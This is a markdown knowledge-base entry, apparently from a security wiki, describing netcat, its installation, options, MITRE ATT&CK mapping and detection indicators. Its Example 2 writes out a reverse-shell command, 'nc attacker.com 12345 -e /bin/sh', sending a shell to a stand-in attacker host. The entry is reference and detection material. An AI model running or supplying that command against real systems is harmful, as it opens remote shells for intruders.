---
id: tool-nc-netcat
url: 'https://nc110.sourceforge.net/'
tags:
  - network
  - shell
type: tool
verified: false
platforms:
  - Linux
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:14.975Z'
validated: true
submitted: true
---
# nc-netcat

**Status**: Unverified

## Overview

Netcat (nc) is a networking utility for reading/writing data across TCP/UDP, commonly used for reverse shells in post-exploitation.

## Description

In this exploit, nc establishes reverse shells from the compromised GitLab server to the attacker's listener after command injection.

## Features

- Feature 1: TCP/UDP connections
- Feature 2: Shell execution (-e)
- Feature 3: Port scanning

## Installation

### Requirements

- Standard utilities

### Install Commands

```bash
# On Ubuntu
apt install netcat-traditional

# On macOS
brew install netcat
```

## Basic Usage

```bash
nc --help
```

### Common Options

| Option | Description |
|--------|-------------|
| -e | Execute command |
| -l | Listen mode |

## Examples

### Example 1: Basic Usage

```bash
nc -l -p 12345
```
(Listen)

### Example 2: Advanced Usage

```bash
nc attacker.com 12345 -e /bin/sh
```
(Reverse shell)

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Unix Shell]] Unix Shell
- [[Encrypted Channel]] Encrypted Channel

### Tactics

- [[Execution]] Execution

## Detection

Indicators and methods for detecting this tool's usage:

- Monitor outbound connections on high ports
- Detect nc process with -e flag

## Related Procedures

- [[procedures/Verify-Payload-Execution-and-Command-Injection]]

## Related Tools

- [[tools/git]]

## References

- Official documentation: https://nc110.sourceforge.net/
